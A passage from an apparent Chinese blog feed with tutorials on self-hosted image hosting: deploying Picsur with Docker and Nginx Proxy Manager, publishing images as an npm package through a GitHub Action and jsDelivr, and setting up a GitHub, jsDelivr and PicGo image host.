title="打开服务器防火墙（非必需）并访问网页"></a>打开服务器防火墙（非必需）并访问网页</h3><p>有些服务器可能不需要，阿里云的服务器需要在安全组开启上面代码中我们使用的8003端口，才能使用8003端口访问服务器。</p><p><strong>开启8003端口以后最好重启一下实例</strong></p><p>查看端口是否被占用（以 8003 为例），输入：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:8003  <span class="comment">#查看 8003 端口是否被占用，如果被占用，重新自定义一个端口</span></span><br></pre></td></tr></table></figure><p>如果啥也没出现，表示端口未被占用，可以继续下面的操作了～</p><p>如果出现：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-bash: lsof: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure><p>运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install lsof  <span class="comment">#安装 lsof</span></span><br></pre></td></tr></table></figure><p>如果端口没有被占用，理论上已经可以输入 <code>http:// + 服务器ip:8003</code> 访问到picsur了。<br><strong>端口被占用了就修改一下端口，比如改成 8081，注意 docker-compose.yml 文件里和防火墙都要改</strong></p><div class="note green anzhiyufont anzhiyu-icon-fan simple"><p>到这里，其实已经能够使用picsur了。但是，访问的网址直接暴露了ip，而且不方便记忆，所以下面做一下反向代理。由于我现在只有一台服务器，一般反向代理需要两台以上，以后再做迁移吧。</p></div><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a>反向代理</h3><p>我这里使用的是Nginx Proxy Manager，Nginx Proxy Manager也是使用Docker部署的，参考这篇<a href="https://blog.xxfer.cn/posts/79f9b780.html">博客</a>。熟悉宝塔的同学当然也可以使用宝塔做反向代理。</p><h4 id="如果picsur和Nginx-Proxy-Manager部署在不同服务器上"><a href="#如果picsur和Nginx-Proxy-Manager部署在不同服务器上" class="headerlink" title="如果picsur和Nginx Proxy Manager部署在不同服务器上"></a>如果picsur和Nginx Proxy Manager部署在不同服务器上</h4><ol><li>在添加反向代理之前，需要确保已经完成域名解析：域名解析添加<code>A</code>记录，<code>主机名</code>自定义（这里以picsur为例），<code>记录值</code>为Nginx Proxy Manager所在服务器的IP地址<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95bf501b67.webp"/></div></div></li><li>在Nginx Proxy Manager中添加<code>Proxy Host</code>：<div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95c0110bd5.webp"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95c0c03a56.webp"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95c1acb320.webp"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95c259d1bc.webp"/></div></div><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95c2fe5797.webp"/></div></div></li></ol><h4 id="如果picsur和Nginx-Proxy-Manager部署在同一服务器上"><a href="#如果picsur和Nginx-Proxy-Manager部署在同一服务器上" class="headerlink" title="如果picsur和Nginx Proxy Manager部署在同一服务器上"></a>如果picsur和Nginx Proxy Manager部署在同一服务器上</h4><p>与上面有一点点变化，就是在下面的这一步：</p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95c0c03a56.webp"/></div></div><p><strong>原本图中标注3的位置需要改为Docker容器内部IP</strong><br>通过下面命令可以查看对应的 Docker 容器内部 IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip addr show docker0</span><br></pre></td></tr></table></figure><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/03/07/65e95c494ab33.webp"/></div></div><p>这里涉及到的是Docker的网络模式，感兴趣的同学可以学习一下这个视频：</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1Aj411r71b/?spm_id_from=333.337.search-card.all.click&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658fb2cbc152c.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">Docker网络模式</div>            <div class="tag-link-sitename">技术蛋老师</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><p>配置完毕，理论上已经大家可以通过域名访问picsur了。</p><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>可能会遇到无法访问，可能的原因：<br>Nginx Proxy Manager会用到 80、443 端口，所以服务器不能占用这些端口，或者服务器防火墙不能禁止这些端口。<br>关闭服务器占用80、443端口的进程，并在服务器安全组里添加80、443端口（有些服务器需要，像阿里云服务器就需要手动添加）</p></div><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>其实也不难，大家自己攻略。因为这个项目还在开发中，所以讲一下版本更新方法，其实也不难。</p><h3 id="更新picsur"><a href="#更新picsur" class="headerlink" title="更新picsur"></a>更新picsur</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/picsur</span><br><span class="line"></span><br><span class="line">docker compose down </span><br><span class="line"></span><br><span class="line"><span class="built_in">cp</span> -r /root/data/docker_data/picsur /root/data/docker_data/picsur.archive  <span class="comment"># 万事先备份，以防万一</span></span><br><span class="line"></span><br><span class="line">docker compose pull</span><br><span class="line"></span><br><span class="line">docker compose up -d    <span class="comment"># 请不要使用 docker-compose stop 来停止容器，因为这么做需要额外的时间等待容器停止；docker-compose up -d 直接升级容器时会自动停止并立刻重建新的容器，完全没有必要浪费那些时间。</span></span><br><span class="line"></span><br><span class="line">docker image prune  <span class="comment"># prune 命令用来删除不再使用的 docker 对象。删除所有未被 tag 标记和未被容器使用的镜像</span></span><br></pre></td></tr></table></figure><p>提示：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING! This will remove all dangling images.</span><br><span class="line">Are you sure you want to <span class="built_in">continue</span>? [y/N] </span><br></pre></td></tr></table></figure><p>输入<code>y</code><br>利用 Docker 搭建的应用，更新非常容易嘿嘿</p><h3 id="卸载picsur"><a href="#卸载picsur" class="headerlink" title="卸载picsur"></a>卸载picsur</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /root/data/docker_data/picsur</span><br><span class="line"></span><br><span class="line">docker-compose down</span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line"></span><br><span class="line"><span class="built_in">rm</span> -rf /root/data/docker_data/picsur  <span class="comment"># 完全删除映射到本地的数据</span></span><br></pre></td></tr></table></figure><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>感觉图床也就这样告一段落了，博客封面啥的就放在Freeimg图床上，毕竟有2个GB，够我造好长时间了。博客内部的图片就放在picsur上面，然后npm和jsDelivr图床就当作备用方案。这样已经足够我使用的了，大家如果有什么推荐，欢迎在评论区留言。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Docker </tag>
            
            <tag> ECS </tag>
            
            <tag> 图床 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>npm自建免费图床方案</title>
      <link href="/posts/a008ab16.html"/>
      <url>/posts/a008ab16.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e8608799f2b.png</cover>
      <date>Tue Jan 09 2024 15:05:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<div class="note blue anzhiyufont anzhiyu-icon-fan simple"><p>使用感受：访问速度比较慢，如果自己配置了CDN缓存策略或者可以尝试多个镜像源，可能会好一点。<br>2024.01.16已将本篇博客图片转移至自建Picsur图床。<br>2024.03.13本文图片重新使用npm+免费cdn搭建的npm图床，加速节点为<a href="https://gcore.jsdelivr.net/">https://gcore.jsdelivr.net</a></p></div><p>最新图床方案请看<a href="https://blog.xxfer.cn/posts/6a3f672a.html">我的图床方案</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天摸鱼的时候搭了一个npm图床，也是免费的，访问速度至少目前挺快的，推荐给大家，顺便做个记录。</p><p>npm有大量的镜像站，且npm可以使用版本号增量更新。但是搭建起来还是有些麻烦的，而且和GitHub图床一样有可能被查，可以作为一种<code>备用方案</code>吧，大家自己考虑是否使用。</p><p><strong>同样，这篇博客中的图片就放在该图床上</strong></p><h2 id="搭建步骤"><a href="#搭建步骤" class="headerlink" title="搭建步骤"></a>搭建步骤</h2><h3 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h3><ol><li>登录<a href="https://npmjs.com/">npm官网</a>，没有账号的注册一个，点击右上角的头像，进入Access Token。</li></ol><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.2/a008ab16/npm1.png" style="width:650px;"/></div></div><ol start="2"><li>点击 Generate New Token，选择 Classic Token。</li></ol><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.2/a008ab16/npm2.png" style="width:800px;"/></div></div><ol start="3"><li>勾选 Automation，点击 Generate Token 生成令牌。</li></ol><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.2/a008ab16/npm3.png" style="width:800px;"/></div></div><p><strong>然后将生成的Token令牌保存好，只显示一次</strong></p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.2/a008ab16/npm4.png" style="width:800px;"/></div></div><h3 id="GitHub"><a href="#GitHub" class="headerlink" title="GitHub"></a>GitHub</h3><ul><li>需要一个 Github 账号，以及一个已经创建好的仓库，名称随意，权限私有或者公开都可以。参考<a href="https://blog.xxfer.cn/posts/92211228.html">jsDelivr自建免费图床方案</a></li></ul><ol><li><strong>进入仓库</strong>，选择 Settings，选择 Secrets 中的 Actions</li></ol><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.2/a008ab16/secret1.png" style="width:800px;"/></div></div><ol start="2"><li>点击 New repository secret 添加一个新的 Secret</li></ol><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.2/a008ab16/secret2.png" style="width:800px;"/></div></div><ol start="3"><li>Name 填写 NPM_TOKEN，Secret 填写前面获取的 npm 令牌</li></ol><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.2/a008ab16/secret3.png" style="width:800px;"/></div></div><ol start="4"><li>在仓库<code>根目录</code>中新建一个 package.json 文件，内容如下：</li></ol><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">name 必须要小写</span><br><span class="line">version 随意</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;xxfer-pic&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;1.0.0&quot;,</span><br><span class="line">  &quot;description&quot;: &quot;Somewhere to save the file from @xxfer&quot;,</span><br><span class="line">  &quot;author&quot;: &quot;LJJ(@xxfer)&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.2/a008ab16/packet.png"/></div></div><h3 id="本地文件夹"><a href="#本地文件夹" class="headerlink" title="本地文件夹"></a>本地文件夹</h3><ol><li>在本地创建一个空的文件夹，打开git终端将图床仓库clone下来：</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> git@github.com:[username]/[AssetsRepo].git</span><br><span class="line"><span class="comment">#或者</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/[username]/[AssetsRepo].git</span><br></pre></td></tr></table></figure><ol start="2"><li>在 clone 下来的[AssetsRepo]文件夹内打开终端，输入以下指令切换回原生源</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config <span class="built_in">set</span> registry https://registry.npmjs.org</span><br></pre></td></tr></table></figure><ol start="3"><li>添加本地 npm 用户设置</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 仅第一次使用需要添加用户，之后会提示你输入你的npm账号密码以及注册邮箱</span></span><br><span class="line">npm adduser</span><br><span class="line"><span class="comment"># 非第一次使用直接登录即可，之后会提示你输入你的npm账号密码以及注册邮箱</span></span><br><span class="line">npm login</span><br></pre></td></tr></table></figure><ol start="4"><li>运行 npm 初始化指令，把整个图床仓库打包，按照指示进行配置，注意需要事先确认你的包名没有和别人已发布的包重复，可以在 npm 官网搜索相应包名，搜不到就说明还没被占用。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm init</span><br></pre></td></tr></table></figure><div class="img-wrap"><div class="img-bg"><img class="img" src="https://gcore.jsdelivr.net/npm/xxfer-pic@1.0.3/a008ab16/npminit.png"/></div></div><p>最后会输出一段 package.json，请求确认，输入 yes 即可。</p><ol start="5"><li>然后输入发布指令，我们就可以把包发布到 npm 上了。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm publish</span><br></pre></td></tr></table></figure><p>jsdelivr+npm 的图片引用和 jsdelivr+github 很相似，例如我在[AssetsRepo]仓库里存放的&#x2F;img&#x2F;index.png</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># jsDelivr+github链接</span></span><br><span class="line">https://gcore.jsdelivr.net/gh/[GithubUserName]/[AssetsRepo]/img/index.png</span><br><span class="line"><span class="comment"># jsDelivr+npm链接</span></span><br><span class="line">https://gcore.jsdelivr.net/npm/[NpmPackageName]/img/index.png</span><br></pre></td></tr></table></figure><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>jsDelivr+Npm 依然有 100MB 的包大小限制，但是 NPM 有丰富的国内节点。可以挑选一个使用。个人推荐知乎的，没有大小限制，而且也很稳定。</p></div><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【jsd出品，网宿国内节点】</span><br><span class="line">https://gcore.jsdelivr.net/npm/:package@:version/:file</span><br><span class="line">【unpkg 自建】</span><br><span class="line">https://cdn.cbd.int/:package@:version/:file</span><br></pre></td></tr></table></figure><p>当然也可以利用<a href="https://unpkg.com/">unpkg</a>自建。(UNPKG 是一个内容源自 npm 的全球快速 CDN。它部署在 cloudflare 上，在大陆地区访问到的是香港节点。所以速度也不错。)</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://unpkg.com/:package@:version/:file</span><br></pre></td></tr></table></figure><ol start="6"><li>如果每次都要在本地进行npm publish的话，npm 的提交是整个包一起上传的，不存在增量更新，耗时不说，而且还往往需要架梯子才能正常上传。所以我们可以把它交给 github action 来完成。</li></ol><ul><li><p>在本地的[AssetsRepo]文件夹下新建[AssetsRepo]&#x2F;.github&#x2F;workflows&#x2F;autopublish.yml</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">Node.js</span> <span class="string">Package</span></span><br><span class="line"><span class="comment"># 监测图床分支，2020年10月后github新建仓库默认分支改为main，记得更改</span></span><br><span class="line"><span class="attr">on:</span></span><br><span class="line">  <span class="attr">push:</span></span><br><span class="line">    <span class="attr">branches:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">publish-npm:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/checkout@v2</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">uses:</span> <span class="string">actions/setup-node@v1</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="string">&quot;12.x&quot;</span></span><br><span class="line">          <span class="attr">registry-url:</span> <span class="string">https://registry.npmjs.org/</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">run:</span> <span class="string">npm</span> <span class="string">publish</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">NODE_AUTH_TOKEN:</span> <span class="string">$&#123;&#123;secrets.npm_token&#125;&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>在本地的[AssetsRepo]文件夹下添加想要上传的图片，然后打开git终端，运行以下指令，上传新增内容至 github，即可触发部署。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将更改提交</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">&quot;npm publish&quot;</span></span><br><span class="line"><span class="comment"># 更新package版本号</span></span><br><span class="line">npm version patch</span><br><span class="line"><span class="comment"># 推送至github触发action</span></span><br><span class="line">git push <span class="comment">#这里可能会遇到报错，大家可以使用git pull origin main然后git push</span></span><br></pre></td></tr></table></figure><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>此处的四行指令顺序严格。<br>每次更新 npm 图床都需要先修改[AssetsRepo]\package.json里的version,也就是版本号。<br>而npm version patch即为更新 package.json 里的版本号的指令，效果是末尾版本号+1，例如0.0.1&#x3D;&gt;0.0.2、1.1.3&#x3D;&gt;1.1.4。免去了打开package.json再修改版本号的麻烦。（大版本更新还是需要手动改的）<br>更新 npm 图床务必要记得更新package.json里的版本号！</p></div></li></ul><h2 id="目前可访问的镜像源"><a href="#目前可访问的镜像源" class="headerlink" title="目前可访问的镜像源"></a>目前可访问的镜像源</h2><p>访问慢一般是因为：</p><ul><li>国内没有他们的CDN节点</li><li>CDN上没有同步你的npm包，有些镜像源都是从 CDNJS 上同步的数据，CDNJS 并不会把所有的 npm 包进行同步，所以当你需要的一些 npm 包没有在 CDNJS 上面，你就用不了这些国内 CDN 了。</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">国外 CDN 节点：</span><br><span class="line">https://unpkg.com/:package@:version/:file</span><br><span class="line">https://gcore.jsdelivr.net/npm/:package@:version/:file</span><br><span class="line">https://fastly.jsdelivr.net/npm/:package@:version/:file</span><br><span class="line">https://cdn.cbd.int/:package@:version/:file</span><br><span class="line"></span><br><span class="line">国内公益 CDN 节点：</span><br><span class="line">Zkeq 的渺软 CDN</span><br><span class="line">https://jsd.onmicrosoft.cn/npm/:package@:version/:file           #回源jsd</span><br><span class="line">https://npm.onmicrosoft.cn/:package@:version/:file               #回源unpkg</span><br><span class="line">https://cdnjs.onmicrosoft.cn/ajax/libs/:package/:version/:file   #回源cdnjs 这个访问好像存在问题</span><br><span class="line">夏柔 CDN</span><br><span class="line">https://font.onmicrosoft.cn/:package/:version/:file              #目前只支持.css .woff2 .woff .ttf .otf后缀文件的加速</span><br><span class="line"></span><br><span class="line">有博主推荐，但我使用不了，大家试试：</span><br><span class="line">https://github.elemecdn.com/:package@:version/:file</span><br><span class="line">https://npm.elemecdn.com/:package@:version/:file</span><br><span class="line">https://unpkg.zhimg.com/:package@:version/:file</span><br></pre></td></tr></table></figure><p>建议都尝试一下，看看速度，有些镜像还是比较快的，同时欢迎大家在评论区分享自己觉得好用的镜像。所以npm图床还是建议作为一个应急备用的方案，不建议大量使用。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>可以看出npm图床创建起来还是有些麻烦的，但是不失为一种备用图床的方案。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> 自建应用项目 </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsDelivr自建免费图床方案</title>
      <link href="/posts/92211228.html"/>
      <url>/posts/92211228.html</url>
      <cover>https://www.freeimg.cn/i/2024/03/06/65e860c61771c.png</cover>
      <date>Mon Jan 08 2024 21:14:00 GMT+0000</date>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>相信刚开始建站的同学都想要一个方便管理的图床，今天发现一个免费的图床搭建方案，访问挺快的，也方便管理。</p><p>最新图床方案请看<a href="https://blog.xxfer.cn/posts/6a3f672a.html">我的图床方案</a></p><p><strong>本篇博客中的图片就都放在该图床上</strong></p><div class="note orange anzhiyufont anzhiyu-icon-fan simple"><p>2024.01.13：不够稳定，访问时快时慢，自行斟酌是否使用。已将图片转移至Freeimg图床。</p></div><h2 id="视频推荐教程"><a href="#视频推荐教程" class="headerlink" title="视频推荐教程"></a>视频推荐教程</h2><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://www.bilibili.com/video/BV1P64y1H7eY/?spm_id_from=333.337.search-card.all.click&vd_source=91a233ea2e45cea087336c119461d12b">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="">          <i class="anzhiyufont anzhiyu-icon-link" style=""></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">GitHub+PicGo+JsDelivr 打造高效免费图床视频教程</div>            <div class="tag-link-sitename">库源吧</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><h2 id="jsDelivr-GitHub-PicGo"><a href="#jsDelivr-GitHub-PicGo" class="headerlink" title="jsDelivr+GitHub+PicGo"></a>jsDelivr+GitHub+PicGo</h2><div class="note orange anzhiyufont anzhiyu-icon-dengpao simple"><p>GitHub图床访问国内速度慢，所以使用jsDelivr（CDN）加速访问。需要注意的是：</p><ol><li>GitHub容量为1GB，需要定时更换仓库，而且有可能会被官方删除，一般不会有事的，毕竟官方没那么闲</li><li>jsDelivr可能会因为DNS污染访问变慢，不过官方会定期修复，最好配备应急方案</li></ol></div><h3 id="创建一个新的GitHub库"><a href="#创建一个新的GitHub库" class="headerlink" title="创建一个新的GitHub库"></a>创建一个新的GitHub库</h3><p>如果没有GitHub账号的同学可以参考这篇<a href="https://blog.csdn.net/m0_67906358/article/details/128808210">博客</a></p><p><strong>GitHub国内访问比较慢，需要“科学”上网</strong></p><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a2524139a3d.png" style="width:800px;"/></div></div><p>README文件可加可不加</p><h3 id="生成Token令牌"><a href="#生成Token令牌" class="headerlink" title="生成Token令牌"></a>生成Token令牌</h3><ul><li>右上角头像，进入setting</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a25240c1608.png" style="width:800px;"/></div></div><ul><li>进入左侧栏底部的Deployer settings</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a2523fd5dd3.png" style="width:800px;"/></div></div><ul><li>新建Token</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a25240cb6b6.png" style="width:800px;"/></div></div><ul><li>选择参数后点击下面的创建，<strong>然后会生成一串字符，就是你的Token，只会出现一次，建议暂时不要关闭这个页面</strong></li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a25240cd411.png" style="width:800px;"/></div></div><h3 id="下载并安装PicGo工具并配置"><a href="#下载并安装PicGo工具并配置" class="headerlink" title="下载并安装PicGo工具并配置"></a>下载并安装PicGo工具并配置</h3><ul><li>下载</li></ul><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://github.com/Molunerfinn/PicGo">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2024/01/09/659cb418d9cef.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">GitHub源码</div>            <div class="tag-link-sitename">PicGo</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><p>网盘提取码：xia2</p><div calss='anzhiyu-tag-link'><a class="tag-Link" target="_blank" href="https://pan.baidu.com/s/1oMzjI2BAh1T4lntcanwvUQ?pwd=xia2">    <div class="tag-link-tips">引用站外地址</div>    <div class="tag-link-bottom">        <div class="tag-link-left" style="background-image: url(https://www.freeimg.cn/i/2023/12/30/658f84e46d5ad.png)">          <i class="anzhiyufont anzhiyu-icon-link" style="display: none"></i>        </div>        <div class="tag-link-right">            <div class="tag-link-title">V2.3.1Windows安装包</div>            <div class="tag-link-sitename">PicGo</div>        </div>        <i class="anzhiyufont anzhiyu-icon-angle-right"></i>    </div>    </a></div><ul><li>安装好了以后，打开进行图床配置</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a2524120395.png" style="width:800px;"/></div></div><p><strong>自定义域名一定是<a href="https://cdn.jsdelivr.net/gh/%E8%B4%A6%E6%88%B7%E5%90%8D/%E4%BB%93%E5%BA%93%E5%90%8D">https://cdn.jsdelivr.net/gh/账户名/仓库名</a></strong></p><ul><li>PicGo设置</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a25240c4094.png" style="width:800px;"/></div></div><ul><li>选择GitHub图床</li></ul><div class="img-wrap"><div class="img-bg"><img class="img" src="https://www.freeimg.cn/i/2024/01/13/65a25240e826f.png" style="width:800px;"/></div></div><p>至此，图床创建完成，在上传之前最好重启一下PicGo，我一开始配置好后好像不能立马生效。</p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>PicGo其实还支持其他的图床，大家有兴趣自行了解。OSS是需要付费的，七牛云和又拍云有免费额度。</p>]]></content>
      
      
      <categories>
          
          <category> 技术分享 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 图床 </tag>
            
            <tag> 自建应用项目 </tag>
            
            <tag> jsDelivr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker命令整理：本地开发环境的快捷配置方式</title>
      <link href="/posts/b2d12a7e.html"/>
      <url>/posts/b2d12a7e.html</url>
      <cover>https://www.freeimg.cn/i/2024/01/04/6596bdc640d4b.jpg</cover>
      <date>Thu Jan 04 2024 10:12:08 GMT+0000</date>
      
